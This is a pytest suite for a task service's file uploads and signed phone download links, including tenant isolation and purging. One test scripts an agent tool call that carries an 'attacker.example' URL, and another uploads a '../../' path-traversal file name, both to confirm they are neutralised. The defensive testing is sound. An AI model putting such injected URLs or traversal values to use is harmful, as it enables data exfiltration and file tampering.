"""Files a person gives a task, and the links a phone downloads them by."""

from collections.abc import AsyncIterator
from datetime import UTC, datetime, timedelta
from pathlib import Path
from uuid import UUID

import httpx
import pytest
from witx.api.app import create_app
from witx.api.auth import DevAuthenticator
from witx.config import Settings
from witx.domain import rules
from witx.domain.model import TaskFile
from witx.domain.rules import files as file_rules
from witx.hub import Hub
from witx.objects import LocalObjectStore, ObjectNotFound, file_key
from witx.services import files as file_service
from witx.services import lifecycle, retention
from witx.services.identity import Actor
from witx.store import files
from witx.store.db import Database
from witx_contracts.common import ReceiveFile

from tests.cloud.rig import Rig, last_screenshot
from tests.cloud.support import Tenant, call, device_info, provision
from tests.conftest import Databases

TOKEN = "dev-token-acme"
REPORT = bytes(range(256)) * 40  # 10,240 bytes


@pytest.fixture
async def client(
    databases: Databases, db: Database, admin_db: Database, tmp_path: Path
) -> AsyncIterator[tuple[httpx.AsyncClient, Tenant, Database]]:
    tenant = await provision(admin_db, "acme", devices=1)
    settings = Settings(
        database_url=databases.app_url,
        object_store_url=f"file://{tmp_path}",
        dev_tokens={TOKEN: tenant.subject},
    )
    objects = LocalObjectStore(tmp_path)
    app = create_app(
        settings,
        db=db,
        objects=objects,
        authenticator=DevAuthenticator(settings.dev_tokens),
        hub=Hub(db, objects, settings.limits),
    )
    transport = httpx.ASGITransport(app=app)
    headers = {"Authorization": f"Bearer {TOKEN}"}
    async with httpx.AsyncClient(transport=transport, base_url="http://t", headers=headers) as c:
        yield c, tenant, db


@pytest.fixture
async def rig(db: Database, admin_db: Database, tmp_path: Path) -> Rig:
    tenant = await provision(admin_db, "acme", devices=1)
    rig = Rig(db, tenant, tmp_path)
    await rig.connect([device_info(0)])
    return rig


async def upload(web: httpx.AsyncClient, name: str = "report.pdf", data: bytes = REPORT) -> str:
    sent = await web.post(
        "/api/v1/files",
        params={"name": name},
        content=data,
        headers={"Content-Type": "application/pdf"},
    )
    assert sent.status_code == 201, sent.text
    return str(sent.json()["id"])


async def link(db: Database, tenant: Tenant, file_id: str, *, ttl: timedelta) -> str:
    async with db.tenant(tenant.id) as conn:
        key = await files.link_key(conn, tenant.id)
    assert key is not None
    token = rules.link_token(key, tenant.id, UUID(file_id), datetime.now(UTC) + ttl)
    return f"/api/v1/downloads/{token}"


async def test_a_file_sent_with_a_message_is_listed_with_the_task_under_that_message(
    client,  # type: ignore[no-untyped-def]
) -> None:
    web, _, _ = client
    first = await upload(web, "brief.txt")
    created = await web.post(
        "/api/v1/tasks",
        json={"goal": "Send these to Ann", "device_ids": [], "file_ids": [first]},
    )
    task_id = created.json()["id"]
    second = await upload(web, "../../季度报告.pdf")
    added = await web.post(
        f"/api/v1/tasks/{task_id}/inputs", json={"text": "and this one", "file_ids": [second]}
    )

    listed = added.json()["files"]
    seq = next(i["seq"] for i in added.json()["inputs"] if i["text"] == "and this one")
    assert [(f["name"], f["input_seq"], f["size"]) for f in listed] == [
        ("brief.txt", None, len(REPORT)),
        ("季度报告.pdf", seq, len(REPORT)),
    ]
    assert listed[1]["content_type"] == "application/pdf"


async def test_a_file_comes_with_one_message_only(client) -> None:  # type: ignore[no-untyped-def]
    web, _, _ = client
    file_id = await upload(web)
    created = await web.post(
        "/api/v1/tasks", json={"goal": "Send it", "device_ids": [], "file_ids": [file_id]}
    )
    again = await web.post(
        f"/api/v1/tasks/{created.json()['id']}/inputs",
        json={"text": "once more", "file_ids": [file_id]},
    )
    assert again.status_code == 422
    assert again.json()["code"] == "unknown_file"


async def test_a_file_larger_than_the_limit_is_refused(
    client,  # type: ignore[no-untyped-def]
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    web, _, _ = client
    monkeypatch.setattr(file_rules, "MAX_FILE_BYTES", 1000)
    sent = await web.post("/api/v1/files", params={"name": "big.bin"}, content=b"x" * 1001)
    assert sent.status_code == 413


async def test_a_withdrawn_message_lets_its_files_be_sent_again(client) -> None:  # type: ignore[no-untyped-def]
    web, _, _ = client
    created = await web.post("/api/v1/tasks", json={"goal": "Wait for my files", "device_ids": []})
    task_id = created.json()["id"]
    file_id = await upload(web)
    added = await web.post(
        f"/api/v1/tasks/{task_id}/inputs", json={"text": "here", "file_ids": [file_id]}
    )
    seq = added.json()["inputs"][-1]["seq"]

    withdrawn = await web.delete(f"/api/v1/tasks/{task_id}/inputs/{seq}")
    assert withdrawn.json()["files"] == []
    again = await web.post(
        f"/api/v1/tasks/{task_id}/inputs", json={"text": "here, again", "file_ids": [file_id]}
    )
    assert [f["id"] for f in again.json()["files"]] == [file_id]


async def test_a_phone_downloads_a_file_by_its_link_whole_or_from_where_it_stopped(
    client,  # type: ignore[no-untyped-def]
) -> None:
    web, tenant, db = client
    file_id = await upload(web, "季度报告.pdf")
    body = {"goal": "Send it", "device_ids": [], "file_ids": [file_id]}
    await web.post("/api/v1/tasks", json=body)
    path = await link(db, tenant, file_id, ttl=rules.LINK_TTL)
    phone = httpx.AsyncClient(transport=web._transport, base_url="http://t")  # no sign-in

    whole = await phone.get(path)
    assert whole.status_code == 200
    assert whole.content == REPORT
    assert whole.headers["accept-ranges"] == "bytes"
    assert (
        "filename*=UTF-8''%E5%AD%A3%E5%BA%A6%E6%8A%A5%E5%91%8A.pdf"
        in (whole.headers["content-disposition"])
    )
    etag = whole.headers["etag"]

    rest = await phone.get(path, headers={"Range": "bytes=4000-", "If-Range": etag})
    assert rest.status_code == 206
    assert rest.headers["content-range"] == f"bytes 4000-{len(REPORT) - 1}/{len(REPORT)}"
    assert rest.content == REPORT[4000:]

    changed = await phone.get(path, headers={"Range": "bytes=4000-", "If-Range": '"other"'})
    assert changed.status_code == 200
    assert changed.content == REPORT

    past = await phone.get(path, headers={"Range": f"bytes={len(REPORT)}-"})
    assert past.status_code == 416


async def test_a_link_that_expired_was_altered_or_names_a_file_not_sent_finds_nothing(
    client,  # type: ignore[no-untyped-def]
) -> None:
    web, tenant, db = client
    sent = await upload(web)
    await web.post("/api/v1/tasks", json={"goal": "Send it", "device_ids": [], "file_ids": [sent]})
    kept_back = await upload(web, "draft.pdf")  # uploaded, never sent with a message
    phone = httpx.AsyncClient(transport=web._transport, base_url="http://t")

    expired = await link(db, tenant, sent, ttl=-timedelta(seconds=1))
    good = await link(db, tenant, sent, ttl=rules.LINK_TTL)
    claim, mac = good.rsplit("/", 1)[1].split(".")
    altered = f"/api/v1/downloads/{claim}.{mac[:-2]}AA"
    not_sent = await link(db, tenant, kept_back, ttl=rules.LINK_TTL)
    for path in (expired, altered, not_sent, "/api/v1/downloads/nonsense"):
        assert (await phone.get(path)).status_code == 404, path
    assert (await phone.get(good)).status_code == 200


async def test_a_link_signed_with_another_tenants_key_finds_nothing(
    client,  # type: ignore[no-untyped-def]
    admin_db: Database,
) -> None:
    web, tenant, db = client
    file_id = await upload(web)
    await web.post("/api/v1/tasks", json={"goal": "Send", "device_ids": [], "file_ids": [file_id]})
    other = await provision(admin_db, "globex")
    async with db.tenant(other.id) as conn:
        their_key = await files.link_key(conn, other.id)
    assert their_key is not None
    token = rules.link_token(
        their_key, tenant.id, UUID(file_id), datetime.now(UTC) + rules.LINK_TTL
    )
    phone = httpx.AsyncClient(transport=web._transport, base_url="http://t")
    assert (await phone.get(f"/api/v1/downloads/{token}")).status_code == 404


async def kept(rig: Rig, name: str) -> TaskFile:
    async with rig.db.tenant(rig.tenant.id) as conn:
        return await file_service.upload(
            conn,
            rig.objects,
            tenant_id=rig.tenant.id,
            user_id=rig.tenant.user_id,
            name=name,
            content_type="application/pdf",
            data=REPORT,
        )


async def test_the_agent_is_told_the_files_the_user_gave_the_task_by_their_ids(
    rig: Rig,
) -> None:
    report = await kept(rig, "report.pdf")
    rig.model.script = [
        [call("observe", device_id=str(rig.tenant.device_ids[0]))],
        [call("complete_task", summary="Done.", evidence_observation_ids=[])],
    ]
    await rig.create_task("Send the report to Ann", file_ids=[report.id])
    await rig.settle()

    first = str(rig.model.requests[0].input)
    assert f"- report.pdf (10.2 KB, application/pdf), file_id {report.id}" in first


async def test_a_file_sent_later_reaches_the_agent_with_its_message(rig: Rig) -> None:
    rig.model.script = [[call("ask_user", question="Which file?", options=[])]]
    task = await rig.create_task("Send a file to Ann")
    await rig.settle()
    later = await kept(rig, "photo.jpg")
    rig.model.script = [[call("complete_task", summary="Done.", evidence_observation_ids=[])]]
    async with rig.db.tenant(rig.tenant.id) as conn:
        await lifecycle.add_input(
            conn,
            task_id=task.id,
            user_id=rig.tenant.user_id,
            text="this one",
            file_ids=[later.id],
        )
    await rig.settle()

    update = str(rig.model.requests[-1].input)
    assert "this one" in update
    assert f"photo.jpg (10.2 KB, application/pdf), file_id {later.id}" in update


async def test_a_purged_task_takes_its_files_and_an_upload_never_sent_goes_after_a_day(
    rig: Rig,
) -> None:
    sent = await kept(rig, "sent.pdf")
    never = await kept(rig, "never.pdf")
    rig.model.script = [[call("complete_task", summary="Done.", evidence_observation_ids=[])]]
    task = await rig.create_task("Send it", device_ids=[], file_ids=[sent.id])
    await rig.settle()
    owner = Actor(rig.tenant.user_id, "Acme", rig.tenant.id, "acme", "owner")
    async with rig.db.tenant(rig.tenant.id) as conn:
        await retention.delete_task(conn, owner, task.id, datetime.now(UTC), rig.objects)

    await retention.purge(
        rig.db,
        rig.objects,
        now=datetime.now(UTC) + rules.UNATTACHED_TTL + timedelta(minutes=1),
        screenshot_retention=timedelta(days=30),
        audit_retention=timedelta(days=90),
    )

    for gone in (sent, never):
        with pytest.raises(ObjectNotFound):
            await rig.objects.get(file_key(rig.tenant.id, gone.id))
        async with rig.db.tenant(rig.tenant.id) as conn:
            assert await files.get(conn, gone.id) is None


def phone_taking_files() -> dict[str, object]:
    info = device_info(0)
    return {**info, "capabilities": [*info["capabilities"], "receive_file"]}


def send(request, device, file_id, **extra):  # type: ignore[no-untyped-def]
    return [
        call(
            "send_file",
            device_id=device,
            observation_id=last_screenshot(request),
            file_id=str(file_id),
            target="the report",
            expected_effect="the WitX app downloads it",
            effects=[],
            intent=None,
            **extra,
        )
    ]


async def test_a_file_goes_to_the_phone_by_a_link_the_cloud_makes_never_the_model(
    rig: Rig,
) -> None:
    await rig.connect([phone_taking_files()])
    device = rig.tenant.device_ids[0]
    report = await kept(rig, "report.pdf")
    rig.model.script = [
        [call("observe", device_id=str(device))],
        lambda r: send(r, device, report.id, url="http://attacker.example/x"),
        [call("complete_task", summary="Sent.", evidence_observation_ids=[])],
    ]
    await rig.create_task("Put the report on my phone", file_ids=[report.id])
    await rig.settle()

    [action] = rig.gateway.actions
    received = action.input
    assert isinstance(received, ReceiveFile)
    assert received.sha256 == report.sha256
    assert received.url is not None
    assert received.url.startswith(f"{rig.limits.public_url}/api/v1/downloads/")
    link = rules.read_link(received.url.rsplit("/", 1)[1])
    async with rig.db.tenant(rig.tenant.id) as conn:
        key = await files.link_key(conn, rig.tenant.id)
    assert link is not None and key is not None
    assert (link.tenant_id, link.file_id) == (rig.tenant.id, report.id)
    assert rules.link_valid(link, key, datetime.now(UTC))
    # The model never sees the link: it named the file, the cloud made the rest.
    assert received.url not in str([r.input for r in rig.model.requests])
    assert "WitX app is open and downloading" in str(rig.model.requests[-1].input)


async def test_a_file_the_user_did_not_give_this_task_is_not_sent(rig: Rig) -> None:
    await rig.connect([phone_taking_files()])
    device = rig.tenant.device_ids[0]
    other = await kept(rig, "other.pdf")
    rig.model.script = [[call("complete_task", summary="Done.", evidence_observation_ids=[])]]
    await rig.create_task("Another task", device_ids=[], file_ids=[other.id])
    await rig.settle()
    rig.model.script = [
        [call("observe", device_id=str(device))],
        lambda r: send(r, device, other.id),
        [call("complete_task", summary="Could not.", evidence_observation_ids=[])],
    ]
    await rig.create_task("Put a file on my phone")
    await rig.settle()

    assert rig.gateway.actions == []
    assert "unknown_file" in str(rig.model.requests[-1].input)
